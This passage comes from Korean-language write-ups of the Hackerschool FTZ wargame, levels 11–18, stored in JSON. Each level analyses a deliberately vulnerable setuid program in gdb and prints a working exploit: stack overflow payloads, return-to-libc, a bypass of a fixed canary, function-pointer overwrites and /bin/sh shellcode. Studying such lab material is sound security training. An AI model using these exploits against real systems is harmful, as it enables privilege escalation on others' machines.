\r\n\r\nstrcpy가 사용되는 부분을 살펴보면 str의 시작부분은 ebp로부터 0x108byte위에 존재하는 것을 알 수 있다. 따라서 return address를 조지기 위해선 0x10c byte(padding 0x108 + ebp 0x04)길이의 padding 뒤에 우리가 원하는 주소값을 넣으면 된다.<br><br>\r\n그러나 문제가 발생한다. stack 메모리 영역이 프로그램이 실행될때마다 다른 주소로 mapping이 되기 때문에 실행할 때마다 주입한 shellcode의 주소가 달라진다.(ASLR) 이를 극복하기 위해서 padding을 shellcode보다 위에 놓고, padding내용을 아무것도 실행하지 말라는 뜻의 명령어인 0x90(nop)으로 채워넣어서 주소값이 변하더라도 padding영역 어느 곳으로 점프한다면 nop을 따라서 쭉 내려오다가 결국 shellcode를 실행할 수 있도록하는 즉, shellcode 실행의 확률을 높이는 nop sled를 사용할 수 있겠다. 그러나, 이것은 어디까지나 확률을 높이는 것일 뿐이기에, ASLR이 걸려있지 않은 다른 영역을 사용하는 방법을 모색했다.\r\n\r\n<img src=\"/picture/hacker_school/ftz/level11_2.png\" width=\"700\"/>\r\n\r\n### Return To Library (RTL)\r\n\r\n```bash\r\n[level11@ftz level11]$ ldd attackme \r\n\tlibc.so.6 => /lib/tls/libc.so.6 (0x42000000)\r\n\t/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)\r\n[level11@ftz level11]$ ldd attackme \r\n\tlibc.so.6 => /lib/tls/libc.so.6 (0x42000000)\r\n\t/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)\r\n[level11@ftz level11]$ ldd attackme \r\n\tlibc.so.6 => /lib/tls/libc.so.6 (0x42000000)\r\n\t/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)\r\n```\r\n\r\nldd는 프로그램에 사용되는 shared library의 정보를 출력해주는 명령어이다.<br>\r\n여러번 호출했음에도 불구하고 library의 주소값이 일치하는 것으로 보아 shared library에는 ASLR이 걸려있지 않은 것을 알 수 있다.<br>\r\nshared library에 있는 system함수를 호출하기로 했다. system함수를 호출하기 위해선 __libc_system 함수를 호출해야한다.<br>\r\n왜 __libc_system을 호출해야되는지 모르겠으면 직접 system함수를 호출하는 코드를 짜서 gdb로 뜯어보자.\r\n\r\n```bash\r\n[level11@ftz tmp]$ objdump -d /lib/tls/libc.so.6 > result.txt\r\n[level11@ftz tmp]$ vi result.txt\r\n\r\n4203f2c0 <__libc_system>:\r\n4203f2c0: 55 push %ebp\r\n4203f2c1: 89 e5 mov %esp,%ebp\r\n4203f2c3: 83 ec 18 sub $0x18,%esp\r\n4203f2c6: 89 75 f8 mov %esi,0xfffffff8(%ebp)\r\n```\r\n\r\nsystem의 인자로 우리가 실행하고자 하는 명령어를 담은 문자열의 주소값을 전달해야한다. shell을 얻고싶기 때문에 \"/bin/sh\"의 주소값을 찾아서 넣으면 된다. 신기하게도 libc 내부에는 \"/bin/sh\"값이 존재하기 때문에 strings명령어를 이용하여 위치를 찾을 수 있다. 그리고 이는 shared library안에 존재하는 것이므로 ASLR이 걸려있지 않다.\r\n\r\n```bash\r\n[level11@ftz tmp]$ strings -tx /lib/tls/libc.so.6 | grep \"/bin/sh\"\r\n 127ea4 /bin/sh\r\n\r\n# 0x42000000부터 libc library가 mapping되어있다.\r\n(gdb) x/s 0x42127ea4\r\n0x42127ea4 <__libc_ptyname2+2161>:\t \"/bin/sh\"\r\n```\r\n\r\n따라서 아래와 같이 입력을 해주면 쉘을 딸 수 있다. 주의할 점은 주소값은 little endian이기 때문에 반대로 적어줘야한다는 것이고, system함수 주소와 \"/bin/sh\" 주소 사이에 4byte padding이 들어가는 이유는 함수 호출 규약에 의해 함수의 첫번째 인자 위에 return address가 들어있어야 하기 때문에 return address부분에 padding을 넣은 것이다.\r\n\r\n```bash\r\n# padding 0x10c byte + system함수 주소 + 4byte padding + \"/bin/sh\" 주소\r\n[level11@ftz level11]$ ./attackme `python -c \"print('A'*0x10c + '\\xc0\\xf2\\x03\\x42\\x41\\x41\\x41\\x41\\xa4\\x7e\\x12\\x42\\n')\"`\r\nsh-2.05b$ my-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow, nop sled, RTL\r\n\r\nASLR\r\n```","dir":"/hacker_school/ftz/","name":"level11.md","path":"hacker_school/ftz/level11.md","url":"/hacker_school/ftz/level11.html"},{"sort":12,"layout":"default","title":"Level 12","content":"# Level 12\r\n\r\n```note\r\nid : level12\r\n\r\npassword : it is like this\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n \r\nint main( void )\r\n{\r\n\tchar str[256];\r\n\r\n \tsetreuid( 3093, 3093 );\r\n\tprintf( \"문장을 입력하세요.\\n\" );\r\n\tgets( str );\r\n\tprintf( \"%s\\n\", str );\r\n}\r\n```\r\n\r\ngets는 input의 길이에 상관없이 개행문자를 만날때까지 복사를 한다. 따라서 buffer overflow 취약점이 존재한다.<br>\r\n이번에는 argv가 아니라 stdin을 통해서 입력받기 때문에 pipe를 이용하여 입력해야하는 점을 제외하면 level11과 똑같다<br><br>\r\nGDB를 이용하여 attackme의 main함수를 disassemble했다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x08048470 (main+0):\tpush   %ebp\r\n0x08048471 (main+1):\tmov    %esp,%ebp\r\n0x08048473 (main+3):\tsub    $0x108,%esp\r\n0x08048479 (main+9):\tsub    $0x8,%esp\r\n0x0804847c (main+12):\tpush   $0xc15\r\n0x08048481 (main+17):\tpush   $0xc15\r\n0x08048486 (main+22):\tcall   0x804835c (setreuid)\r\n0x0804848b (main+27):\tadd    $0x10,%esp\r\n0x0804848e (main+30):\tsub    $0xc,%esp\r\n0x08048491 (main+33):\tpush   $0x8048538\r\n0x08048496 (main+38):\tcall   0x804834c (printf)\r\n0x0804849b (main+43):\tadd    $0x10,%esp\r\n0x0804849e (main+46):\tsub    $0xc,%esp\r\n\r\n<b>0x080484a1 (main+49):\tlea    0xfffffef8(%ebp),%eax\r\n0x080484a7 (main+55):\tpush   %eax\r\n0x080484a8 (main+56):\tcall   0x804831c (gets) </b>\r\n\r\n0x080484ad (main+61):\tadd    $0x10,%esp\r\n0x080484b0 (main+64):\tsub    $0x8,%esp\r\n0x080484b3 (main+67):\tlea    0xfffffef8(%ebp),%eax\r\n0x080484b9 (main+73):\tpush   %eax\r\n0x080484ba (main+74):\tpush   $0x804854c\r\n0x080484bf (main+79):\tcall   0x804834c (printf)\r\n0x080484c4 (main+84):\tadd    $0x10,%esp\r\n0x080484c7 (main+87):\tleave  \r\n0x080484c8 (main+88):\tret    \r\n0x080484c9 (main+89):\tlea    0x0(%esi),%esi\r\n</pre>  \r\n\r\n```bash\r\n[level12@ftz level12]$ ldd ./attackme \r\n\tlibc.so.6 => /lib/tls/libc.so.6 (0x42000000)\r\n\t/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)\r\n```\r\n\r\nstdin으로 입력받는 것을 제외하면 level11과 환경이 완벽하게 같은 것을 확인할 수 있다. 따라서 아래와 같이 shell을 딸 수 있었다. pipe를 이용하여 stdin으로 redirect했다. `;cat`을 붙이는 이유는 쉘을 딴 후에도 stdin은 pipe에 의해 redirect되어있는 상태기 때문에 cat을 통해서 shell로 input을 전달하도록 해야한다.\r\n\r\n```bash\r\n# padding 0x10c byte + system함수 주소 + 4byte padding + \"/bin/sh\" 주소\r\n[level12@ftz level12]$ (python -c \"print('A'*0x10c + '\\xc0\\xf2\\x03\\x42\\x41\\x41\\x41\\x41\\xa4\\x7e\\x12\\x42\\n')\";cat) | ./attackme\r\n문장을 입력하세요.\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA쟌\u0003BAAAA?\u0012B\r\nmy-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow, RTL\r\n\r\npipe\r\n```","dir":"/hacker_school/ftz/","name":"level12.md","path":"hacker_school/ftz/level12.md","url":"/hacker_school/ftz/level12.html"},{"sort":13,"layout":"default","title":"Level 13","content":"# Level 13\r\n\r\n```note\r\nid : level13\r\n\r\npassword : have no clue\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdlib.h> \r\n\r\nmain(int argc, char *argv[])\r\n{\r\n long i=0x1234567;\r\n char buf[1024];\r\n\r\n setreuid( 3094, 3094 );\r\n if(argc > 1)\r\n strcpy(buf,argv[1]);\r\n\r\n if(i != 0x1234567) {\r\n printf(\" Warnning: Buffer Overflow !!! \\n\");\r\n kill(0,11);\r\n }\r\n}\r\n```\r\n\r\nlevel11과 같은 상황이다. 그러나 지역변수 i값이 변조되었는지 확인하는 루틴이 중간에 껴있다.<br>\r\nbuffer 끝에 random값을 넣어둔 후 해당 random값이 변조가 되었는지 확인하는 과정을 통해 bof를 탐지할 수 있는데, 이를 stack canary라고 한다.<br>\r\n여기서는 random값이 아니므로 충분히 우회가 가능하다.<br><br>\r\nGDB를 이용하여 attackme의 main함수를 disassemble했다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x080484a0 (main+0):\tpush   %ebp\r\n0x080484a1 (main+1):\tmov    %esp,%ebp\r\n0x080484a3 (main+3):\tsub    $0x418,%esp\r\n\r\n<b>0x080484a9 (main+9):\tmovl   $0x1234567,0xfffffff4(%ebp) </b>\r\n\r\n0x080484b0 (main+16):\tsub    $0x8,%esp\r\n0x080484b3 (main+19):\tpush   $0xc16\r\n0x080484b8 (main+24):\tpush   $0xc16\r\n0x080484bd (main+29):\tcall   0x8048370 (setreuid)\r\n0x080484c2 (main+34):\tadd    $0x10,%esp\r\n0x080484c5 (main+37):\tcmpl   $0x1,0x8(%ebp)\r\n0x080484c9 (main+41):\tjle    0x80484e5 (main+69)\r\n0x080484cb (main+43):\tsub    $0x8,%esp\r\n0x080484ce (main+46):\tmov    0xc(%ebp),%eax\r\n0x080484d1 (main+49):\tadd    $0x4,%eax\r\n0x080484d4 (main+52):\tpushl  (%eax)\r\n\r\n<b>0x080484d6 (main+54):\tlea    0xfffffbe8(%ebp),%eax\r\n0x080484dc (main+60):\tpush   %eax\r\n0x080484dd (main+61):\tcall   0x8048390 (strcpy) </b>\r\n\r\n0x080484e2 (main+66):\tadd    $0x10,%esp\r\n\r\n<b>0x080484e5 (main+69):\tcmpl   $0x1234567,0xfffffff4(%ebp)\r\n0x080484ec (main+76):\tje     0x804850d (main+109) </b>\r\n\r\n0x080484ee (main+78):\tsub    $0xc,%esp\r\n0x080484f1 (main+81):\tpush   $0x80485a0\r\n0x080484f6 (main+86):\tcall   0x8048360 (printf)\r\n0x080484fb (main+91):\tadd    $0x10,%esp\r\n0x080484fe (main+94):\tsub    $0x8,%esp\r\n0x08048501 (main+97):\tpush   $0xb\r\n0x08048503 (main+99):\tpush   $0x0\r\n0x08048505 (main+101):\tcall   0x8048380 (kill)\r\n0x0804850a (main+106):\tadd    $0x10,%esp\r\n0x0804850d (main+109):\tleave  \r\n0x0804850e (main+110):\tret\r\n</pre>  \r\n\r\nstrcpy가 사용되는 부분을 살펴보면 buf의 시작주소를 알 수 있고, 0x1234567을 할당하고 비교하는 부분에서 i의 주소를 알 수 있다.<br>\r\nbuf의 시작주소는 $ebp-0x418이고, i의 주소는 $ebp-0xc이다. 따라서 간격계산을 하여 i값이 손상되지 않도록 해야한다.\r\n\r\n<img src=\"/picture/hacker_school/ftz/level13.png\" width=\"700\"/>\r\n\r\n```bash\r\n[level13@ftz level13]$ ldd ./attackme \r\n\tlibc.so.6 => /lib/tls/libc.so.6 (0x42000000)\r\n\t/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)\r\n```\r\n\r\n사용되는 라이브러리와 mapping위치가 level11과 같은 것을 확인할 수 있다. 따라서 아래와 같이 shell을 딸 수 있었다.\r\n\r\n```bash\r\n# padding 0x40c byte + i 값 + 12 byte padding + system함수 주소 + 4byte padding + \"/bin/sh\" 주소\r\n[level13@ftz level13]$ ./attackme `python -c \"print('A'*0x40c+'\\x67\\x45\\x23\\x01AAAAAAAAAAAA\\xc0\\xf2\\x03\\x42\\x41\\x41\\x41\\x41\\xa4\\x7e\\x12\\x42\\n')\"`\r\nsh-2.05b$ my-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow, RTL\r\n\r\nstack canary\r\n```","dir":"/hacker_school/ftz/","name":"level13.md","path":"hacker_school/ftz/level13.md","url":"/hacker_school/ftz/level13.html"},{"sort":14,"layout":"default","title":"Level 14","content":"# Level 14\r\n\r\n```note\r\nid : level14\r\n\r\npassword : what that nigga want?\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <unistd.h>\r\n \r\nmain()\r\n{ int crap;\r\n int check;\r\n char buf[20];\r\n fgets(buf,45,stdin);\r\n if (check==0xdeadbeef)\r\n {\r\n setreuid(3095,3095);\r\n system(\"/bin/sh\");\r\n }\r\n}\r\n```\r\n지역변수 check만 조지면 되는 간단한 문제다.<br><br>\r\nGDB를 이용하여 attackme의 main함수를 disassemble했다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x08048490 (main+0):\tpush   %ebp\r\n0x08048491 (main+1):\tmov    %esp,%ebp\r\n0x08048493 (main+3):\tsub    $0x38,%esp\r\n0x08048496 (main+6):\tsub    $0x4,%esp\r\n0x08048499 (main+9):\tpushl  0x8049664\r\n0x0804849f (main+15):\tpush   $0x2d\r\n\r\n<b>0x080484a1 (main+17):\tlea    0xffffffc8(%ebp),%eax\r\n0x080484a4 (main+20):\tpush   %eax\r\n0x080484a5 (main+21):\tcall   0x8048360 (fgets) </b>\r\n\r\n0x080484aa (main+26):\tadd    $0x10,%esp\r\n\r\n<b>0x080484ad (main+29):\tcmpl   $0xdeadbeef,0xfffffff0(%ebp) </b>\r\n\r\n0x080484b4 (main+36):\tjne    0x80484db (main+75)\r\n0x080484b6 (main+38):\tsub    $0x8,%esp\r\n0x080484b9 (main+41):\tpush   $0xc17\r\n0x080484be (main+46):\tpush   $0xc17\r\n0x080484c3 (main+51):\tcall   0x8048380 (setreuid)\r\n0x080484c8 (main+56):\tadd    $0x10,%esp\r\n0x080484cb (main+59):\tsub    $0xc,%esp\r\n0x080484ce (main+62):\tpush   $0x8048548\r\n0x080484d3 (main+67):\tcall   0x8048340 (system)\r\n0x080484d8 (main+72):\tadd    $0x10,%esp\r\n0x080484db (main+75):\tleave  \r\n0x080484dc (main+76):\tret    \r\n0x080484dd (main+77):\tlea    0x0(%esi),%esi\r\n</pre>  \r\n\r\nlevel13과 거의 같은 문제다. 빠르게 넘어가자.\r\n\r\n```bash\r\n# padding 0x28 byte + 0xdeadbeef\r\n[level14@ftz level14]$ (python -c \"print('A'*0x28+'\\xef\\xbe\\xad\\xde\\n')\";cat) | ./attackme \r\nmy-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow\r\n```","dir":"/hacker_school/ftz/","name":"level14.md","path":"hacker_school/ftz/level14.md","url":"/hacker_school/ftz/level14.html"},{"sort":15,"layout":"default","title":"Level 15","content":"# Level 15\r\n\r\n```note\r\nid : level15\r\n\r\npassword : guess what\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\n \r\nmain()\r\n{ int crap;\r\n int *check;\r\n char buf[20];\r\n fgets(buf,45,stdin);\r\n if (*check==0xdeadbeef)\r\n {\r\n setreuid(3096,3096);\r\n system(\"/bin/sh\");\r\n }\r\n}\r\n```\r\n\r\nlevel14에서는 바로 값을 0xdeadbeef로 바꾸면 되었지만 level15에서는 0xdeadbeef가 위치한 주소값을 넣어야 한다.<br>\r\n소스코드를 보면 `*check==0xdeadbeef`부분에 0xdeadbeef가 존재할 것으로 여겨진다.<br>\r\nobjdump를 이용하여 disassemble하면 기계어와 어셈블리어를 같이 보여준다.\r\n\r\n<pre>\r\n[level15@ftz level15]$ objdump -d ./attackme\r\n\r\n08048490 <main>:\r\n 8048490:\t55                   \tpush   %ebp\r\n 8048491:\t89 e5                \tmov    %esp,%ebp\r\n 8048493:\t83 ec 38             \tsub    $0x38,%esp\r\n 8048496:\t83 ec 04             \tsub    $0x4,%esp\r\n 8048499:\tff 35 64 96 04 08    \tpushl  0x8049664\r\n 804849f:\t6a 2d                \tpush   $0x2d\r\n <b>80484a1:\t8d 45 c8             \tlea    0xffffffc8(%ebp),%eax </b>\r\n 80484a4:\t50                   \tpush   %eax\r\n 80484a5:\te8 b6 fe ff ff       \tcall   8048360 (_init+0x58)\r\n 80484aa:\t83 c4 10             \tadd    $0x10,%esp\r\n <b>80484ad:\t8b 45 f0             \tmov    0xfffffff0(%ebp),%eax </b>\r\n\r\n <b>80484b0:\t81 38 ef be ad de    \tcmpl   $0xdeadbeef,(%eax) </b>\r\n\r\n 80484b6:\t75 25                \tjne    80484dd (main+0x4d)\r\n 80484b8:\t83 ec 08             \tsub    $0x8,%esp\r\n 80484bb:\t68 18 0c 00 00       \tpush   $0xc18\r\n 80484c0:\t68 18 0c 00 00       \tpush   $0xc18\r\n 80484c5:\te8 b6 fe ff ff       \tcall   8048380 (_init+0x78)\r\n 80484ca:\t83 c4 10             \tadd    $0x10,%esp\r\n 80484cd:\t83 ec 0c             \tsub    $0xc,%esp\r\n 80484d0:\t68 48 85 04 08       \tpush   $0x8048548\r\n 80484d5:\te8 66 fe ff ff       \tcall   8048340 (_init+0x38)\r\n 80484da:\t83 c4 10             \tadd    $0x10,%esp\r\n 80484dd:\tc9                   \tleave  \r\n 80484de:\tc3                   \tret\r\n</pre>  \r\n\r\n0x80484b2에 0xdeadbeef값이 존재하는 것을 확인할 수 있었다. 따라서 check에 0x80484b2를 넣으면 된다.\r\n\r\n```bash\r\n# padding 0x28 byte + 0x80484b2\r\n[level15@ftz level15]$ (python -c \"print('A'*0x28+'\\xb2\\x84\\x04\\x08\\n')\";cat) | ./attackme \r\nmy-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow\r\n```","dir":"/hacker_school/ftz/","name":"level15.md","path":"hacker_school/ftz/level15.md","url":"/hacker_school/ftz/level15.html"},{"sort":16,"layout":"default","title":"Level 16","content":"# Level 16\r\n\r\n```note\r\nid : level16\r\n\r\npassword : about to cause mass\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\n \r\nvoid shell() {\r\n setreuid(3097,3097);\r\n system(\"/bin/sh\");\r\n}\r\n \r\nvoid printit() {\r\n printf(\"Hello there!\\n\");\r\n}\r\n \r\nmain()\r\n{ int crap;\r\n void (*call)()=printit;\r\n char buf[20];\r\n fgets(buf,48,stdin);\r\n call();\r\n}\r\n```\r\n\r\n함수포인터인 call에 저장되어있는 printit 함수 주소를 shell 함수 주소로 바꾸면 끝난다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x08048518 (main+0):\tpush   %ebp\r\n0x08048519 (main+1):\tmov    %esp,%ebp\r\n0x0804851b (main+3):\tsub    $0x38,%esp\r\n\r\n<b>0x0804851e (main+6):\tmovl   $0x8048500,0xfffffff0(%ebp) </b>\r\n\r\n0x08048525 (main+13):\tsub    $0x4,%esp\r\n0x08048528 (main+16):\tpushl  0x80496e8\r\n0x0804852e (main+22):\tpush   $0x30\r\n\r\n<b>0x08048530 (main+24):\tlea    0xffffffc8(%ebp),%eax\r\n0x08048533 (main+27):\tpush   %eax\r\n0x08048534 (main+28):\tcall   0x8048384 (fgets) </b>\r\n\r\n0x08048539 (main+33):\tadd    $0x10,%esp\r\n\r\n<b>0x0804853c (main+36):\tmov    0xfffffff0(%ebp),%eax\r\n0x0804853f (main+39):\tcall   *%eax </b>\r\n\r\n0x08048541 (main+41):\tleave  \r\n0x08048542 (main+42):\tret\r\n\r\n\r\n(gdb) disas shell\r\nDump of assembler code for function shell:\r\n<b>0x080484d0 (shell+0):\tpush   %ebp </b>\r\n0x080484d1 (shell+1):\tmov    %esp,%ebp\r\n0x080484d3 (shell+3):\tsub    $0x8,%esp\r\n0x080484d6 (shell+6):\tsub    $0x8,%esp\r\n0x080484d9 (shell+9):\tpush   $0xc19\r\n0x080484de (shell+14):\tpush   $0xc19\r\n0x080484e3 (shell+19):\tcall   0x80483b4 (setreuid)\r\n0x080484e8 (shell+24):\tadd    $0x10,%esp\r\n0x080484eb (shell+27):\tsub    $0xc,%esp\r\n0x080484ee (shell+30):\tpush   $0x80485b8\r\n0x080484f3 (shell+35):\tcall   0x8048364 (system)\r\n0x080484f8 (shell+40):\tadd    $0x10,%esp\r\n0x080484fb (shell+43):\tleave  \r\n0x080484fc (shell+44):\tret    \r\n0x080484fd (shell+45):\tlea    0x0(%esi),%esi\r\n</pre>  \r\n\r\nshell 함수 주소는 0x080484d0이다.\r\n\r\n```bash\r\n# padding 0x28 byte + 0x080484d0\r\n[level16@ftz level16]$ (python -c \"print('A'*0x28+'\\xd0\\x84\\x04\\x08\\n')\";cat) | ./attackme \r\nmy-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow\r\n```","dir":"/hacker_school/ftz/","name":"level16.md","path":"hacker_school/ftz/level16.md","url":"/hacker_school/ftz/level16.html"},{"sort":17,"layout":"default","title":"Level 17","content":"# Level 17\r\n\r\n```note\r\nid : level17\r\n\r\npassword : king poetic\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\n \r\nvoid printit() {\r\n printf(\"Hello there!\\n\");\r\n}\r\n \r\nmain()\r\n{ int crap;\r\n void (*call)()=printit;\r\n char buf[20];\r\n fgets(buf,48,stdin);\r\n setreuid(3098,3098);\r\n call();\r\n}\r\n```\r\n\r\nGDB를 이용하여 attackme의 main함수를 disassemble했다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x080484a8 (main+0):\tpush   %ebp\r\n0x080484a9 (main+1):\tmov    %esp,%ebp\r\n0x080484ab (main+3):\tsub    $0x38,%esp\r\n\r\n<b>0x080484ae (main+6):\tmovl   $0x8048490,0xfffffff0(%ebp) </b>\r\n\r\n0x080484b5 (main+13):\tsub    $0x4,%esp\r\n0x080484b8 (main+16):\tpushl  0x804967c\r\n0x080484be (main+22):\tpush   $0x30\r\n\r\n<b>0x080484c0 (main+24):\tlea    0xffffffc8(%ebp),%eax\r\n0x080484c3 (main+27):\tpush   %eax\r\n0x080484c4 (main+28):\tcall   0x8048350 (fgets) </b>\r\n\r\n0x080484c9 (main+33):\tadd    $0x10,%esp\r\n0x080484cc (main+36):\tsub    $0x8,%esp\r\n0x080484cf (main+39):\tpush   $0xc1a\r\n0x080484d4 (main+44):\tpush   $0xc1a\r\n0x080484d9 (main+49):\tcall   0x8048380 (setreuid)\r\n0x080484de (main+54):\tadd    $0x10,%esp\r\n\r\n<b>0x080484e1 (main+57):\tmov    0xfffffff0(%ebp),%eax\r\n0x080484e4 (main+60):\tcall   *%eax </b>\r\n\r\n0x080484e6 (main+62):\tleave  \r\n0x080484e7 (main+63):\tret\r\n</pre>  \r\n\r\n함수포인터인 call에 저장되어있는 printit 함수 주소를 libc에 있는 system함수로 바꾸는 방법을 사용해보려고 했으나, esp 위치가 좋지 않아서 불가능했다.<br>\r\n그 대신 고정적인 위치에 shellcode를 올려놓은 후, shellcode가 있는 주소값으로 덮어씌우기로 했다.<br>\r\n환경변수는 비교적 고정적인 위치를 가지고 있기 때문에 shellcode를 가진 환경변수를 등록한 후 주소를 가지고 와서 사용하기로 했다.\r\n\r\n```bash\r\n[level17@ftz tmp]$ export shellcode=$(python -c \"print('\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80')\")\r\n```\r\n\r\n환경변수의 주소값을 가져오기 위해 tmp폴더에서 아래와 같은 프로그램을 짰다.\r\n\r\n```c\r\n// vi shellcode.c\r\n// gcc -o shellcode shellcode.c\r\n\r\n#include <unistd.h>\r\n\r\nint main(void)\r\n{\r\n int p = getenv(\"shellcode\");\r\n printf(\"%p\\n\", p);\r\n return 0;\r\n}\r\n```\r\n\r\n가져온 환경변수의 주소값을 attackme에 알맞게 넣어주면 끝난다.\r\n\r\n```bash\r\n[level17@ftz tmp]$ ./shellcode \r\n0xbfffff02\r\n[level17@ftz tmp]$ (python -c \"print('A'*0x28+'\\x02\\xff\\xff\\xbf\\n')\";cat) | ../attackme\r\nmy-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow\r\n```","dir":"/hacker_school/ftz/","name":"level17.md","path":"hacker_school/ftz/level17.md","url":"/hacker_school/ftz/level17.html"},{"sort":18,"layout":"default","title":"Level 18","content":"# Level 18\r\n\r\n```note\r\nid : level18\r\n\r\npassword : why did you do it\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <sys/time.h>\r\n#include <sys/types.h>\r\n#include <unistd.h>\r\nvoid shellout(void);\r\nint main()\r\n{\r\n char string[100];\r\n int check;\r\n int x = 0;\r\n int count = 0;\r\n fd_set fds;\r\n printf(\"Enter your command: \");\r\n fflush(stdout);\r\n while(1)\r\n {\r\n if(count >= 100)\r\n printf(\"what are you trying to do?\\n\");\r\n if(check == 0xdeadbeef)\r\n shellout();\r\n else\r\n {\r\n FD_ZERO(&fds);\r\n FD_SET(STDIN_FILENO,&fds);\r\n \r\n if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)\r\n {\r\n if(FD_ISSET(fileno(stdin),&fds))\r\n {\r\n read(fileno(stdin),&x,1);\r\n switch(x)\r\n {\r\n case '\\r':\r\n case '\\n':\r\n printf(\"\\a\");\r\n break;\r\n case 0x08:\r\n count--;\r\n printf(\"\\b \\b\");\r\n break;\r\n default:\r\n string[count] = x;\r\n count++;\r\n break;\r\n }\r\n }\r\n }\r\n }\r\n }\r\n}\r\n \r\nvoid shellout(void)\r\n{\r\n setreuid(3099,3099);\r\n execl(\"/bin/sh\",\"sh\",NULL);\r\n}\r\n```\r\n\r\ninput값을 1byte씩 읽어서 count값을 줄이거나 input을 write하거나 할 수 있다.<br>\r\ncount값이 음수일 때도 c언어에서는 음수값에 따른 indexing을 수행해버리기 때문에 Out Of Boundary가 발생할 수 있다.<br>\r\nstring, check 등 지역변수의 위치를 파악한다면 충분히 check값을 바꿀 수 있을 것이다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x08048550 (main+0):\tpush   %ebp\r\n0x08048551 (main+1):\tmov    %esp,%ebp\r\n0x08048553 (main+3):\tsub    $0x100,%esp\r\n0x08048559 (main+9):\tpush   %edi\r\n\r\n... (중략) ...\r\n\r\n<b># if(check == 0xdeadbeef)\r\n0x080485ab (main+91):\tcmpl   $0xdeadbeef,0xffffff98(%ebp) # check\r\n0x080485b2 (main+98):\tjne    0x80485c0 (main+112)\r\n0x080485b4 (main+100):\tcall   0x8048780 (shellout) </b>\r\n\r\n... (중략) ...\r\n\r\n<b># default:\r\n0x08048743 (main+499):\tlea    0xffffff9c(%ebp),%eax # string\r\n0x08048746 (main+502):\tmov    %eax,0xffffff04(%ebp)\r\n0x0804874c (main+508):\tmov    0xffffff90(%ebp),%edx # count\r\n0x0804874f (main+511):\tmov    0xffffff94(%ebp),%cl # x\r\n0x08048752 (main+514):\tmov    %cl,0xffffff03(%ebp)\r\n0x08048758 (main+520):\tmov    0xffffff03(%ebp),%al\r\n0x0804875e (main+526):\tmov    0xffffff04(%ebp),%ecx\r\n0x08048764 (main+532):\tmov    %al,(%edx,%ecx,1)        # string[count] = x;\r\n0x08048767 (main+535):\tincl   0xffffff90(%ebp)         # count++;\r\n0x0804876a (main+538):\tjmp    0x8048770 (main+544) </b>\r\n\r\n0x0804876c (main+540):\tlea    0x0(%esi,1),%esi\r\n0x08048770 (main+544):\tjmp    0x8048591 (main+65)\r\n0x08048775 (main+549):\tlea    0xfffffef4(%ebp),%esp\r\n0x0804877b (main+555):\tpop    %ebx\r\n0x0804877c (main+556):\tpop    %esi\r\n0x0804877d (main+557):\tpop    %edi\r\n0x0804877e (main+558):\tleave  \r\n0x0804877f (main+559):\tret\r\n</pre>  \r\n\r\ncheck 변수를 확인하는 부분, switch문의 default문을 살펴보면 지역변수들의 위치를 모두 파악할 수 있다.<br>\r\n각각의 지역변수들의 위치는 아래와 같고, check는 string 바로 위에 붙어있는 것을 알 수 